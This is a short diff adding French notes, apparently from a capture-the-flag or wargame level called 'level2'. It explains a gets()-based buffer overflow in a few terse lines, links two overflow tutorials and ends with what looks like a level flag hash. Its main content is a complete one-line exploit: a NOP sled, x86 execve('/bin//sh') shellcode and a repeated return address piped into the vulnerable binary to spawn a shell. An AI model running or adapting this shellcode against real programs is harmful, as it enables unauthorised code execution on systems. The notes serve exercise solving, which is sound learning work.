@@ -1,0 +1,8 @@
+fflush(stdout) => permet de ne pas stocker en memoire ce qui a dans la fonction gets
+Donc unaff_retaddr est overwritting et est checks
+Mais il y a strop donc local va être stocke dans la heap et la on peut déclencher notre shellcode
+https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
+https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
+
+(python -c 'print "\x90" * 39 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x20\xa0\x04\x08" * 5'; cat) | ./level2
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
